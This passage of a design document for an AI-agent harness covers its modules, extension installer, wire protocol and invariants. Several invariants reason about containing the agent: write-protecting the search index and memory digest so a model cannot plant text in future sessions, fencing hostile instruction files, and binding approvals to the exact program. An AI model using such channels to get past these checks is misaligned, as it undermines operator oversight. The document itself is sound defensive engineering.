- `client/wiring.{summary_provider_request, settlement_of,
  summary_progress, resolution}` — the summary path in pieces: the
  request a structural summary is made as, how a settled response reads,
  what the sink's record means to the machine, and whether a captured
  identity still routes.
- `client/summaries.{Summaries, Settlement, Record, start, stop, pid,
  key, record, read}` — the summary sink: a small bounded actor keyed by
  `(operation, task, attempt)`, the rendezvous between the effect
  process that receives a summary and the driver process that reports on
  it. Nothing here is durable, on purpose; see Invariants.
- `client/system_prompt.{summary_pack, summary_pack_variable}` — the
  summarization pack this boot summarizes with: the shipped one, or the
  file `LOOM_SUMMARY_PACK` names.
- `client/serve.{default_reserve_tokens, default_keep_recent_tokens}` —
  pi's compaction defaults, and the only place they are stated.
  `LOOM_COMPACTION`, `LOOM_COMPACTION_RESERVE` and
  `LOOM_COMPACTION_KEEP_RECENT` override them; settings that cannot
  describe a working compaction disable it rather than firing a
  threshold that prepares nothing.
- `client/contributions.{Origin, Contribution, Collision}` — who
  contributed a tool (`BuiltIn` | `Extension(name)`), one origin's
  ordered tool list, and the refusal when two contributions claim one
  name. `code_mode` is `BuiltIn` and gated on its plane, exactly as
  `history_search`, `remember` and the `schedule_*` tools are.
- `client/contributions.built_in(Option(Agency), Option(CodeMode),
  Option(History), Option(Memory), Option(Schedules))` — the host's own
  single contribution: five core tools, plus the six `agent_*` tools only when
  a messaging plane exists, plus `code_mode` only when this host wired a
  code-mode pipeline, plus `history_search` only when its search index
  opened, plus `remember` only when the memory session beside the session
  file opened, plus the three `schedule_*` tools only when the schedule
  store did. A plane that is absent contributes nothing at all.
- `client/contributions.registry(List(Contribution)) ->
  Result(Registry, Collision)` — the seam an installed extension enters
  the registry through. Last-registration-wins survives *inside* one
  contribution; a name two contributions both claim is refused, so an
  extension can shadow neither a built-in nor a peer. `serve.boot`
  turns a `Collision` into a boot refusal through
  `contributions.collision_message`, which names both origins. What a
  registry produces reaches a session once: the prompt index and
  `active_tool_names` are both fixed at session creation, so an
  extension installed later is seen by the next session, not this one.
- `client/serve.protecting_index(SandboxPolicy, String)` — the base
  policy with the search index added to `protected`. A security property,
  not hygiene: snippets from that index are read back into *future*
  sessions' contexts, so an index a model can write is a channel from one
  execution's output into a later execution's input. `protected` bars
  writes and leaves reads alone, which is exactly the asymmetry wanted.
  `assemble` composes it before `base_policy_fault` validates, so the
  addition is checked by the same gate every other path is.
- `client/serve.protecting_memory(SandboxPolicy, String, String)` — the
  same bargain one step along, over `loom-memory.db` (with its WAL
  family) and `loom-memory.digest`. More direct than the index's: a
  search snippet reaches a later session only if a model searches for it,
  while the digest is injected into **every** run of every session on the
  repository, unasked. Both paths are conditional on a writable root
  reaching their directory — not a refinement but a requirement, since
  neither file exists until a distillation run has happened and the jail
  refuses to mask a *missing* protected path under a read-only parent.
  The two functions share one `protecting(always:, where_writable:)`
  mechanism rather than each carrying a copy.
- `client/serve.Settings.codemode_seams` — which code-mode seams this
  server offers (`--codemode-seams workspace|orchestration|both`,
  default `WorkspaceOnly`). A setting for the same reason
  `base_policy` is one: the choice belongs to whoever stands the server
  up, and the Agency the orchestration seam routes onto does not exist
  until `boot` has built it. An unrecognised flag value is a usage
  error, not a fallback — a typo that quietly served the workspace seam
  would look exactly like a server ignoring the flag.
- `client/serve.Booted` — what `shutdown` takes apart, plus three things
  it is asked about: `prompt: system_prompt.Assembled`, the exact bytes
  this boot handed the wiring (so a test can prove the pinned prompt is
  the one on the wire and the startup line can name its digest);
  `services`, the supervisor over the restartable composition layer;
  `stops`, the subject the host reports a `SIGTERM` or a fatal fault on,
  owned by whichever process called `boot`; `helper_path`, the
  `loom-exec` the ladder settled on, carried so the listening line can
  name the binary that will enforce every jail this session builds; and
  `rulescan`, the triggered-rule scanner's *name* — `None` on a boot
  that configured no rules and therefore started no scanner, which is
  the `codemode.unavailable` posture applied to a second optional
  plane; and `schedulescan`, the same posture applied to a third —
  scheduled heartbeats — carried the same way for the same reason,
  though this scanner answers to no writer subscription at all.
- `client/host.{Stop, adopt, relay_sigterm}` — the root of the server's
  process tree. `adopt` runs a boot on a dedicated exit-trapping process
  so every link an `actor.start` forms lands there rather than on the
  caller; the first fatal death runs the teardown *first* — releasing
  the session lease — and reports `Faulted` afterwards, leaving the exit
  status to the entry point. `relay_sigterm` puts the signal on the same
  subject, so one receive covers both ways the server stops.
- `client/serve.boot_with(settings, logger:)` — `boot` with an injected
  `telemetry/log.Logger`, which is what `main` calls once it has
  installed the JSON handler. The logger is a capability, not a setting
  (§0.2): it is passed rather than parsed, and `boot` itself delegates
  here with `log.discard()` so an embedding test boots a whole server
  without a handler existing at all.
- `client/serve.{Settings, boot, shutdown, main}` — the server entry
  point (`gleam run -m client/serve`, `bin/loomd` via the erlang
  shipment): flags/env in, session + helper pool + broker + system
  prompt + runtime + service supervisor + websocket server up, one
  startup line out, and either `SIGTERM` or a fatal fault runs the same
  `shutdown` so the lease is released rather than left to its TTL.
  `client.main` delegates here for the shipment's entrypoint.
- `client/serve.Settings.demand` — the broker's enforcement contract.
  `main` selects `PlatformEnforcement` by default, which is strict on Linux
  and admits only ADR-006's three reported Darwin gaps. The
  `--full-enforcement` flag asks for Linux-equivalent containment on every
  platform; `--best-effort` explicitly accepts any honest degradation. The
  two flags are mutually exclusive.
- `client/serve.{helper_ladder, seed_ladder}` — the two lookup orders,
  taken as rungs rather than performed inline, because *order* is the
  whole of what they decide and a lookup against the host running a test
  cannot show an order. `helper_ladder` is `--helper`, the tree this
  server shipped in, `PATH`, `./bin`; `seed_ladder` is `--codemode-seed`,
  the workspace's own seed, the bundled one, and a named path for the
  refusal to point at when nothing answers.
- `client/serve.{shell_path, base_policy, degraded, helper_probe_ms}` —
  the host facts the system prompt and the jail must agree on: the shell
  jailed commands run under, the *default* session base policy, and the
  one question the prompt has no other source for — whether a helper's
  hello advertises `degraded`, asked once at open by borrowing from the
  pool the session will use anyway.
- `client/serve.Settings.helper_pool_size` — how many `loom-exec`
  helpers may run at once, and therefore the real ceiling on how wide a
  parallel tool batch runs. `resolve` fills it from `LOOM_HELPER_POOL`
  or `exec.default_pool_size()` (schedulers online), never a literal, and
  clamps *both* to `[exec.min_pool_size, exec.max_pool_size]` = `[4, 16]`.
  Both ends are load-bearing: below two, code mode cannot run at all (a
  satellite holds one helper for the node while the program's capability
  calls ask for another), and above sixteen an operator's typo would ask
  the host for that many live bwrap jails. A batch wider than it waits for a slot
  inside `broker.clear_call` rather than coming back as a resource
  error. Distinct from the broker's pooled `max_outstanding`, which
  refuses amplification rather than describing what the host affords.
- `client/serve.Settings.base_policy` — the base every tool call is
  composed against, and the thing an escalation widens. A field rather
  than a `base_policy(workspace)` call inside `boot`, so a host may serve
  a narrower base and let approvals widen it per call; `main` fills it
  with `base_policy(workspace)`. Under the default nothing can park (see
  Invariants), which is what made the escalation plane unreachable from
  an end-to-end until `client/tui_e2e_test`.
- `client/serve.Settings.home` — the operator's home directory, where the
  global `AGENTS.md` default is looked for when the workspace has none.
  `resolve` fills it from `HOME` and `None` records that `HOME` was
  unset. A field for the same reason `base_policy` is one: a boot that
  reached into the process environment for it would make every test that
  stands a server up read the developer's own `~/.agents/AGENTS.md`.

## Extensions

`client/extension/*` is the install half of the extension design
(`docs/design-notes/extension-architecture.md`, "Hardening the
install"). Two rulings shape it: an install fetches a **tree, not a git
session**, so there is no git client anywhere in the path; and the tree
it fetches is **untrusted input read outside any jail**, so every reader
here is total.

- `client/extension/source` — the grammar of what an operator may type.
  `Source` is `LocalPath | ArchiveUrl | GitHub`; `parse` refuses
  `git://`, `ssh://`, `git+ssh://`, the scp-style `git@host:path`,
  `file://` and `http://` by name, with a message that states the three
  accepted forms. `archive_url` derives codeload's
  `https://codeload.github.com/<owner>/<repo>/tar.gz/<rev>` (`HEAD` when
  no revision was named) and refuses a revision paired with an archive
  URL, because an archive URL already names exactly one tree. `host`
  extracts the lowercase host the fetch policy allows, refusing userinfo
  rather than stripping it.
- `client/extension/archive` — the total tar.gz reader, the local
  directory walker, and the tree digest. `extract` inflates through
  `client/internal/ffi_zlib` under `Caps.max_total_bytes`, abandoning
  the stream the moment it goes over, so a decompression bomb is never
  materialised; the ustar reader then admits only regular files,
  directories and pax headers, refusing links, devices, fifos and GNU
  long-name extensions by name. `from_directory` pushes a real directory
  through the same collector, additionally refuses a symlink (the root
  included — `path` is lstat'd before the walk) and a non-regular file,
  and skips a directory named exactly `.git` so that a working checkout
  reads as its export. `digest` is
  lowercase hex SHA-256 (via `tools/blob.ref_for`, the tree's one
  SHA-256) over a length-prefixed encoding of the sorted files, and is
  independent of `Tree.root` and `Tree.commit` — which is what lets an
  install record be re-verified against a tree staged anywhere.

The exact path subset, and why the space and the invisible formatting
code points are outside it, is stated in `archive`'s module doc.

## Relationships

- **Depends on**: `core` (json, codec, entries, messages), `session`,
  `runtime` (`api`, `effects`, `escalation`, `supervisor`, `writer`),
  `events` (the bus as a hint source), `storage` (catch-up scans),
  `machine` (`acceptance`, `queue`, `codec` — the commands with no api
  entry point build their own plans), `broker` (`policy.Grant`,
  `escalation` vocabulary), `provider` (`stream.Delta` for the tap),
  `prompt` (both packs, the decoder, the renderer, and the
  summarization assembly in `prompt/summary`),
  `codemode` (the vetting policy, the hermetic compile service, the
  production builder and launcher, and the satellite host — the pipeline
  `client/codemode` fills the `tools/codemode` seam with),
  `mcp` (the JSON-RPC codecs, the stdio client actor, the façade
  generator and the value interchange `client/mcp` wires into code mode),
  `telemetry` (the JSON handler this entry point installs, and the
  logger it injects into `api.Options`),
  `mist` + `gleam_http` (the websocket transport), `simplifile` (the
  token file, the pack file, and the session's instruction files),
  `weft` (the bounded concurrent run `client/mcp.start` fans server
  bring-up out over).
- The spec DAG (§0.1) writes `L → A,C,E,K`. The `B`, `D`, `F`, and `G`
  edges are real and load-bearing — catch-up scans storage directly,
  compaction and navigation build `machine/acceptance` plans, the delta
  tap types against `provider/stream`, and grants are broker policy
  values — and are worth knowing about rather than papering over. The
  wiring promotion added `tools` (the registry and per-call `Ctx`);
  `client/serve` added `argv` (flags); `client/catalog` added `tom`
  (the pure-Gleam TOML parser behind `--config`); `client/system_prompt`
  added `prompt`, whose purity is why the I/O had to live on this side;
  `client/schedule` added `gleam_time` as a direct dependency — already
  resolved transitively through `tom`, and its total
  `gleam/time/timestamp.parse_rfc3339` is what a one-shot schedule's
  `at` field parses with, rather than a second RFC3339 parser or TOML's
  own bare datetime literal.
- **Depended on by**: `conformance`, whose wiring and e2e suites import
  `client/wiring` (legal — T depends on all). `packages/tui` is its
  native client, coupled only through the protocol and the golden fixtures.
- **`client/internal/timebase`** is the one non-FFI module under
  `internal/`: it adapts a `core/clock.Clock` and a seam's injected `rest`
  into the `weft/poll.Clock` the two foreground waits run on
  (`escalate.park`, `agency.wait_loop`). Its module doc carries the ruling
  a reader will otherwise re-derive — the successor clock `clock.read`
  hands back is discarded, because `from_function` returns itself and
  re-calls the injected function on every read, and `clock.stepping`
  cannot serve a loop that holds one clock value across many reads. A wait
  built on a clock whose `now` does not move never expires; every fixture
  in this tree that drives one of these waits is a `from_function` over a
  counter actor for that reason.
- **FFI**: `client/internal/ffi_os` over `client_ffi.erl`, serve-only:
  wall clock, unique entropy, `PATH` lookup, `code:root_dir/0` and the
  running ERTS version (the anchor `client/install` builds every
  in-tree path from), `os:type`/machine
  architecture for the prompt's platform line, the SIGTERM relay,
  `sys:terminate/3` for stopping the service supervisor the way OTP
  stops one, and the documented exit-code halt. Test-side, `client_test_ffi.erl` is a
  minimal websocket probe for the boot smoke.

## Traffic

- **Actor messages**: `gateway.Message` — `Attach(sink, reply)` (a call,
  returning the connection id), `Detach(connection)`,
  `FromClient(connection, text)`, `CommitHint`, `BusHint(published)`, and
  `ProviderDelta(operation, delta)` (casts). Senders: `client/server`'s
  socket handlers, `commit_forwarder` (from `runtime/writer.Event`),
  `events/bus` subscriptions, and `tap_provider`'s wrapper. The hub's bus
  subscription is keyed by the session's **canonical id**
  (`bus.key(of: api.session_id(runtime))`), never by the caller-supplied
  display name; `client/serve` supplies no bus, so nothing exercises it
  today, but a host whose hint sources are not all its own writer needs
  the key that identified publishers actually use
  (`protocol-change/008`).
- `history.Message` — `Pull` (a cast: a commit landed, go sync),
  `Synchronize(reply)` (a call, for a test or an operator), `Query(text,
  limit, scope, reply)` (a call, from the tool seam), and `Stop`.
  Senders: `commit_pull`, the writer's *second* subscriber, which is what
  makes recall a commit-driven projection rather than a scheduled sweep;
  and `client/history.seam`, from a live tool call's own effect process.
  Both reach the holder by name, and both degrade an absent or wedged
  holder to an in-band refusal rather than to a dead caller.
- **Commits**: the hub commits nothing of its own except through the
  session's one writer. Commands map onto `runtime/api`
  (text or ordered-content prompt/steer/follow-up/abort, escalation approve/deny, strand
  creation); `compact` and `navigate`, which have no api entry point yet,
  build a `machine/acceptance` plan and commit it through
  `runtime/writer` — the same pattern the conformance simulation runner
  uses. Nothing bypasses the writer.
- **Registers**: reads `strand.*` (configuration, leaf, state, last
  result) and `op.meta`/`op.state` through the session's typed accessors
  to build snapshots and detect terminals; reads the runtime's escalation
  records under `fact.custom`'s reserved `escalation/` prefix, and the
  assembled system prompt and its enforcement identity under the reserved
  `prompt/` prefix — read off the session store directly before `api.open`,
  written back through `api.put_reserved_fact` after it. The rule scanner
  owns the reserved
  `rule/` prefix: `rule/fired/<strand>/<name>` write-once marks, committed
  with the injection they authorize, and `rule/cursor/<strand>`
  checkpoints, written lazily. Every one of the scanner's *reads* goes
  straight to the session store, never through the writer's mailbox, so
  a scan can never sit in front of a settlement; the fire itself is an
  ordinary queue admission through the writer, on the scanner's own
  process. Strand
  seeding for protocol `fork` and `create_strand` writes `strand.config`
  / `strand.leaf` / `strand.state` (the api's creation path always takes
  a task brief, so the gateway seeds idle strands itself).
- **Search index**: `client/history` writes only to the repository's own
  `loom-search.db`, beside the session file and never inside it, through
  `events/search.sync`. Index rows and the advanced cursor commit in one
  transaction, so a crash mid-batch re-runs the batch into the same
  state; a lost poke costs latency and never a row.
- **Memory**: `client/serve` never opens `loom-memory.db` and never
  creates it — its boot probe reads the store's header lease-free
  (`storage/sqlite.generation`), and an absent store is the ordinary
  state of a repository that has never remembered anything. It reads
  `loom-memory.digest` once at boot as bytes and injects them at every
  run start through `memory.digest_hooks`, which is why an updated digest
  lands at the next session boundary rather than mid-session. The two
  writers are `client/distill` (a command, holding the memory session's
  writer lease for its whole run under `run_lease_ttl_ms` — or under the
  short one for a `--cascade` pass, which has no model turn between its
  commits) and the
  `remember` seam (one open per call under the short `lease_ttl_ms`,
  refused in band while a run holds the lease). Usage rows for both model
  turns land in the memory session's own ledger.
- **Wire**: JSON text frames over websocket. The envelope `seq` **is the
  storage seq** of the write that produced the event, so the durable
  stream needs no side index and `catch_up` rebuilds it with
  `scan_entries` / `scan_usage` plus register reads.

## Invariants

- **Envelope decoding is strict; name decoding is tolerant.** `v` must be
  `1`, the discriminator must be present, and a command `id` must be
  present and positive. Unknown `cmd`/`event` *names* survive as
  `UnknownCommand` / `UnknownEvent` so the receiver can answer in band;
  unknown *fields* inside known bodies are ignored (forward compatibility
  within v1).
- **Everything in `protocol` is pure and total.** Malformed input is a
  `ProtocolFault` value, never a crash.
- **A content prompt is admitted atomically.** The gateway decodes every
  block through `core/codec`, validates image base64 and non-empty MIME types,
  and refuses an empty or partly malformed list before `runtime/api` sees it.
  A successful command appends one `UserMessage` in the original block order.
- **Durable JSON crosses verbatim.** Gateway-defined field names are
  `snake_case`, but values that already have a durable form in the
  harness — entries, messages, usage — are carried in `core/codec`'s
  vocabulary (pi field names, camelCase) rather than re-rendered.
- **The wire form is pinned by the golden fixtures** under
  `packages/client/testdata/protocol/`, which this package decodes and
  re-encodes byte for byte. Three details differ from `core/codec` and
  the wire follows the fixtures: `toolCall` blocks nest under a
  `toolCall` key, `thinking` blocks always carry `redacted`, and floats
  print positionally (`0.00027`, not `2.7e-4` — see
  `protocol.to_wire_text`). Changing either side is a protocol change,
  never silent drift.
- **Immutable rows replay exactly; register-backed events replay as
  current state.** `entry` and `usage` events are scanned by seq range,
  so a resume reproduces them; `op_transition`, `escalation`, and
  `strand_result` are read from registers, which keep no history, so a
  superseded phase is not reconstructible. Events are hints and the
  snapshot carries live state, so a client that missed an intermediate
  phase still converges — overlap and gaps are resolved by seq dedup, as
  the protocol already requires.
- **The writer's post-commit publication is production's hint source,
  and `serve` supplies no bus** (issue #8's aside, decided). A
  one-session server's writer and hub share a VM, so
  `commit_forwarder` already carries every commit; adding a bus
  subscription would trigger the same pull twice. `Options.bus` remains
  for a host whose hints are not all its own writer's — a projection, a
  second node's session, telemetry — which is what `events/bus.bridge`
  exists to feed.
- **Live materialization is a pull, never an apply.** Both the writer's
  post-commit publication and any bus publication merely trigger a pull
  from storage above the hub's high-water seq; a lost hint costs latency,
  never an event.
- **Stream deltas are ephemeral.** They are broadcast without a seq,
  never persisted, and the tap lives entirely in the composition seam —
  the runtime is untouched by it.
- **Every upgrade without the exact bearer token is answered `401`**
  before any websocket state exists. `LocalAuth` binds loopback and puts
  the token in a `0600` file next to the session, moving the
  peer-credential check into the filesystem, because `mist` has no
  unix-socket listener to carry `SO_PEERCRED`.
- **A strand's durable `active_tool_names` is canonical: sorted, with
  duplicates collapsed, and every name registered.** The list renders
  into the request's tool array, which sits ahead of the system prompt
  in the provider's render order, and prompt caching matches on an
  exact byte prefix — so a reordering costs both cache-head writes on
  every subsequent turn. The hub canonicalizes at the `set_config`
  boundary and `client/wiring.tool_specs` sorts again at render.
  Neither moves the authorization line: `wiring.clear` admits a call by
  `list.contains` on this same list, and set membership is blind to
  order and multiplicity.
- **The system prompt is assembled at a session's first open and pinned
  with its enforcement demand.** Every later boot at the same demand sends
  the pinned bytes rather than deriving them again — the agent may have
  edited `CLAUDE.md`, the kernel may have changed under a restart, and a
  prompt re-derived from moved inputs is a full one-hour cache write on the
  first turn after every restart. The demand is the one deliberate cache
  break: a changed flag or a legacy pin with no demand identity renders and
  pins once, because keeping bytes that claim stronger enforcement than the
  broker now demands would trade truth for cache stability. Both cells live
  under the reserved `prompt/` prefix, so no model-reachable `put_fact` can
  rewrite the operator's channel.
- **The pin is read before `api.open` and written after it.**
  `wiring.Config.system` must hold the string before the open, and the
  open is what stands the writer up — so the cells are read straight off
  the session store while nothing owns it, and written back through
  `api.put_reserved_fact` once there is a writer to journal it. Same knot
  as the Agency's, solved by ordering rather than by a name because the
  value is data, not a process.
- **Nothing volatile may enter `system_prompt.Host`.** No clock, date,
  elapsed time, token count, cost, git state, id, strand name or random
  value — and no numeric field at all, which is the shape all of those
  arrive in. The list fields are sorted and de-duplicated by
  `pack.environment` before they can reach the bytes, for the same reason
  the tool array is sorted: both sit inside the cached prefix. The one
  exception is `available_tools`, the prompt's tool index, which is
  de-duplicated but not sorted: its order is the registry's registration
  order, which is fixed for the session and is what a reader wants.
- **A prompt pack refuses loudly or serves; it never disappears.** A pack
  file that cannot be read, does not decode, or renders to nothing stops
  the boot with a worded message naming the file and the fault — a
  silently-empty system prompt is the failure this seam exists to end. A
  pack that merely trips `pack.problems` (a dropped section, a misspelled
  placeholder) warns on stderr and serves: `decode` accepts more than
  `problems` approves by design, and a thin prompt beats a dead server.
- **The workspace's instruction files outrank the operator's, and only a
  file that is not there lets the lookup move on.** Slot one is
  `AGENTS.md` — the cross-tool convention — taken from the workspace when
  it has one and otherwise from `~/.agents/AGENTS.md`, then
  `~/.loom/AGENTS.md`; slot two is the workspace's `CLAUDE.md`, which has
  no global fallback. A workspace `AGENTS.md` that exists but is oversize
  or unreadable warns and leaves its slot empty rather than falling
  through to the operator's defaults: serving standing operator
  instructions in place of a project file that happened to be unreadable
  would swap one set of instructions for another behind everyone's back.
  Every one of these reads warns and continues; none of them can stop a
  boot. `HOME` unset is the launcher's hard failure degraded to a
  warning, because a missing instruction file must never cost a session.
- **The fence around an instruction file is the harness's, and its
  `origin` attribute is a claim only the harness can make truthfully.**
  At most one `user-default` block exists and it is always the first,
  which is what the pack's prose tells the model to check; the bytes
  inside a block are otherwise verbatim, and framing a hostile file does
  not make it safe — it stops it speaking with the operator's voice, and
  the residual risk is accepted and named, exactly as it was for the
  single-file case.
- **The Agency is reached through a name, never through a captured
  runtime.** `api.open` takes the `Effects` record and returns the
  `Runtime`, and `Runtime` *contains* `effects` — so a closure reachable
  from `Effects` that captures the `Runtime` is a value cycle, not an
  ordering problem. `agency.seam` closes over a minted process name (the
  same indirection `gateway.commit_forwarder` uses) and `agency.start`
  stands a holder up under it after the open. The holder answers exactly
  one message and answers it with the runtime *value*: the tools do the
  work on their own effect process, because a holder that did the work
  would serialize every agent call in the session behind whichever one
  was inside a wait.
- **A strand may wait only on a descendant and address only its parent or
  a descendant** — decided from the durable lineage ledger, never from
  anything a model says. A strand with no lineage cell is a root and is
  nobody's descendant: "no lineage fact" fails closed. That is what makes
  the wait graph acyclic and a blocking `agent_wait` safe.
- **The bound with an answer fires first.** Two capabilities this package
  services answer on bounds of their own, and both must sit *below*
  `client/codemode.default_call_timeout_ms` (120 s): `client/mcp`'s
  `default_call_timeout_ms` (60 s) and `agency.default_config`'s
  `max_wait_ms` (30 s), the ceiling one `agent_wait`/`strand.wait` is
  clamped to. A `ServedHere` call the satellite host gives up on is
  answered `unsettled` and its worker killed, so inverting either ordering
  would trade a real answer for that refusal on *every* call. The
  constants live in three modules and nothing but a test can hold them in
  relation, so each is pinned by one:
  `the_mcp_call_timeout_wins_the_race_test` and
  `the_wait_ceiling_wins_the_race_test`.
- **A reap does one thing on the driver process: `spawn_unlinked`.**
  `Hooks.run_end` fires inside `drive_loop`, on the driver, before any
  `actor.continue` — so a hook that read a register would be a
  `call_forever` from the driver and a hook that waited would stop it
  serving `Nudge`, `RequestAbort` and `PollTick`, which is exactly the
  property that makes a blocking tool safe. Every read, abort and commit
  a reap performs happens on the spawned process. The hook carries no
  strand and does not need one: a lineage cell records the *operation*
  that minted it, so "reap what this run spawned" is a ledger predicate.
- **A reap's intent is durable and its abort is re-issued.** `api.abort`
  is a no-op when no driver is registered, so a reap that landed
  mid-restart would otherwise evaporate and the child would run until the
  session closed. The mark is written once and every later observation
  re-issues the abort.
- **A spawn adopts an existing child on a name match only when the ledger
  says this caller minted it.** Handing an existing child back is the
  reconciliation path that makes `agent_spawn` `ReplaySafe`, and it is
  worth keeping — but a name is *derived* and a lineage cell is
  *recorded*, and only the second is evidence. So `minted_by` is compared
  against the caller's own call site — the operation, `agent.minting_step`
  (the step with the minter folded in, since `lineage.CallSite` has no
  field for a program's ordinal) and the source index — and a mismatch is
  refused as `agent.NameAlreadyMinted`, never adopted. Adoption without
  that check is an ownership transfer rather than a reconciliation: the
  adopting spawn's brief, tools, `within_ms`, `detach` and `result_schema`
  are all discarded (`write_result_schema` runs only on the minting
  branch), `check_capacity` is skipped so the adopted child costs nothing
  against `fan_out`, and the caller goes on to wait on a strand doing
  somebody else's work and report its answer as the answer to a question
  it never asked. The name derivation is what makes a collision
  unreachable; this is what makes one harmless if it were reached.
- **The blackboard is clamped on both sides.** `agent_note` writes under
  `agent/{caller}/`; `agent_notes` with no prefix reads `agent/` and not
  the whole non-reserved fact namespace, which is what
  `api.facts(prefix: None)` would hand back.
- **A result contract is enforced on the child's write, not on the
  parent's read.** A spawn's `result_schema` is stored at
  `result-schema/{child}` — written *before* the lineage cell, so a crash
  between the two can leave a schema with no child and never a child
  whose contract vanished — and quoted into the child's brief. The check
  then runs inside `note`, on the child's own `agent_note` call, because
  the child is the party that can repair the value and the moment it can
  repair it cheaply is the run that produced it; checking only at the
  join would tell the one party that cannot act. `wait` validates again
  on the way out, not as a second authorization but because the cell
  comes back out of the durable store and a value crossing that boundary
  is decoded rather than trusted. The contract cell sits outside
  `agent/`, which is the whole of what keeps it out of a model's reach:
  `agent_note` prepends `agent/{caller}/` and `agent_notes` lists under
  `agent/` alone, so a child can neither rewrite what it is judged
  against nor read what its siblings were asked for.
- **A report into a *finished* parent is refused.** `api.send_to_strand`
  accepts a fresh run when the target is idle, which would wake a
  finished parent with no human present — the exact property auto-
  enqueued child results were rejected over. The refusal is upward only:
  a parent giving an idle child more work is a live agent's explicit
  decision inside its own run.
- **The rule scanner's "provably dead" is the ledger's `reaped` mark,
  never a terminal `strand.last_result` alone** (issue #113). The
  asymmetry above is exactly why: since a live ancestor may still hand
  an idle *child* fresh work — never refused, unlike the upward case —
  a finished strand is not a dead one, and `client/rulescan` would
  silence an operator's rule on a strand that might fire again tomorrow
  if it treated "finished" as "will never run again". Only
  `client/agency`'s own decision to end a child (an overdue deadline, or
  its parent's run ending undetached — `reap`, in `client/agency`) is
  durable and deliberate enough to trust, and even that is a named
  residual rather than a mechanical guarantee: nothing stops a live
  ancestor that still remembers the child's name from addressing it
  after the reap. `client/rulescan`'s module doc has the full argument
  and the FAIL OPEN branches (no cell, a cell that will not decode).
- **A code-mode submission is judged against the seam it named, and
  routed by the seam the host wired.** The two halves are read from
  different places on purpose. The allowlist follows the *submission*
  (`exec_config` takes its vetting policy from `Request.seam`), so a
  refusal the model reads is about the surface it asked for. The router
  and the admission ceilings follow the *surface*, so a host serving one
  seam hands out that seam's router whatever a request names and no
  submission can widen what the operator wired. A request naming a seam
  the surface does not serve is refused by the tool shell before
  `execute` is called and again by `execute` itself — `StartFailed`,
  nothing dispatched, both stages unreported — rather than being
  reinterpreted as the seam the host does serve. The residual mismatch
  that arrangement allows can only narrow: a program vetted against one
  seam's imports and routed by the other's cannot import the modules
  whose calls that router services, so it reaches nothing at all.
- **A code-mode policy refusal is raised once, for the whole execution,
  and only from the satellite launch.** Code mode clears through the
  broker the pipeline holds rather than through `Ctx.clear_call`, so
  until #97 a refused execution reached no escalation plane and nothing
  could mint the grants #24 taught it to spend. `execute` now wraps the
  pipeline's launcher, re-asks the launch's own composition question
  (`launch.node_requirements` ⊕ the base ⊕ the identity's grants, so
  there is nothing to drift), and reports the shortfall outward as
  `tools/codemode.RunRefused`; `wiring.tool_context` supplies the raise
  seam that turns it into a durable record, and the tool shell
  re-executes once on an approval. Three clearance points, one raise: the
  hermetic build composes with the grants already dropped, so no approval
  can widen it and the question would be unanswerable; a capability call
  refused inside a *running* program is refused after effects have
  happened, and the one thing an approval buys is a re-execution, which
  `replay: tool.Never` says must never happen. The launch is the only one
  where nothing has run yet, so the re-execution repeats no effect and
  the action a human consents to is still the whole submitted program.
- **The action a code-mode approval binds to is the program.**
  `wiring`'s raise builds `escalate.Refused` with `tool: "code_mode"` and
  `arguments: run.arguments` — the same post-clearance arguments the
  broker path uses — so `record_id` digests `{strand, "code_mode", wanted
  diff}` and `action_digest` digests the submission. A retry of the same
  program inherits the approval and spends it; a *different* program
  wanting the same diff lands on the same record id, fails the action
  binding, and re-opens the question with no grants (#65). That is the
  seam where consent would most easily leak, because the want is coarse
  and the program is everything.
- **A code-mode execution runs under the calling strand's own
  `{op_id, step_id}`.** The hermetic build, the jailed `erl`, and every
  capability call the running program makes are dispatched under that one
  pair, which is the *batch* identity the broker pools budget on —
  so the compile and the run share one ledger and one wall deadline
  rather than minting a second budget, and `broker.abort` on the
  operation reaches the build and the node alike. The pooled
  outstanding-effect cap is never below two: the node holds one for its
  whole life.
- **Both jailed stages' enforcement reports travel in the outcome.**
  `pipeline.execute` returns them beside the outcome — the build's from
  `compile.Compiled`, the node's from `satellite.Run`, whose report is
  what `CapConnection.destroy` returns — so this module does not wait on
  a mailbox and has no grace period to lose. It only restates them as
  `tools/codemode.Report`, splitting the helper's `skip:` entries out of
  the applied list so no renderer can present a skipped layer as an
  enforced one (issue #5).
- **The harness-side capability bridge builds no clearance, and
  re-derives no authorization.** `fs.read`, `fs.list`, `kv.*` and
  `report.emit` are answered as `satellite.ServedHere` — no
  `broker.CallSpec`, no jail, no composed policy — because none of them
  leaves the VM and a policy whose enforcer is not present is not a
  check (issue #16). What contains them instead is `tools/fs`'s own
  `resolve_real`, called by the injected closure: the *same* function
  `fs_read` calls, so a symlink planted inside the workspace and pointing
  out of it is refused for the bridge exactly as it is for the model's
  own tool. Writing a second resolution here would be a second boundary
  to keep correct, and the one that got it wrong would be the one nobody
  was reading. The write arms are wired through the same discipline:
  `fs.write` resolves through `resolve_writable`, so a satellite program
  meets the protected-path refusal (#105) exactly where the model's own
  `fs_write` does, and `fs.edit` is read-apply-write inside one served
  call under `codemode/workspace.apply_replacements`' exactly-once
  find/replace ruling — the tightest window the seam can offer, and a
  strictly tighter one than the two-round-trip composition a program
  would otherwise hand-roll.
  The write itself is `fs.write_whole`, which is what `fs_write` calls,
  so **both doors create missing parents** and `new_dir/file.txt` means
  one thing whichever door it came through. A `fs.list` of a
  non-directory is `NotADirectory` under the `not_a_directory` code
  rather than an errno sentence, because it is the one listing failure a
  program can act on — `fs.read` was the call it wanted — and
  `readdir`'s own `ENOTDIR` brings the special files (FIFO, socket,
  device node) under the same honest name.
- **A base policy the sandbox cannot enforce is a boot failure.**
  `Settings.base_policy` is a field, so a host may hand `boot` any
  policy value it can construct, and `assemble` asks
  `base_policy_fault` before a directory is made, a lease is taken or a
  helper is spawned. The case that motivated it: a relative `protected`
  entry is refused by the jail as `RelativePath` and covers nothing in
  the harness's own path checks, so an operator who wrote
  `protected: [".git"]` would otherwise get a session protecting nothing
  and learn about it from the first tool call of it. The check is
  `broker/policy.validate`'s — the same one every composed policy passes
  immediately before dispatch — so what refuses here is exactly what
  would refuse there. Pure and separate from `boot`, because it is a
  decision about a value and should be testable as one.
- **A blob is established by a rename, never by a write.** `report.emit`
  writes through `blob.write_addressed`: the bytes are staged under a
  temporary name in the blob root and renamed into place, so a crash
  mid-write can never leave a partial file at an address whose SHA-256
  name vouches for the whole of it. The staging name carries eight
  random bytes off `Config.entropy`, because two concurrent first
  emissions of identical bytes are precisely the pair a content address
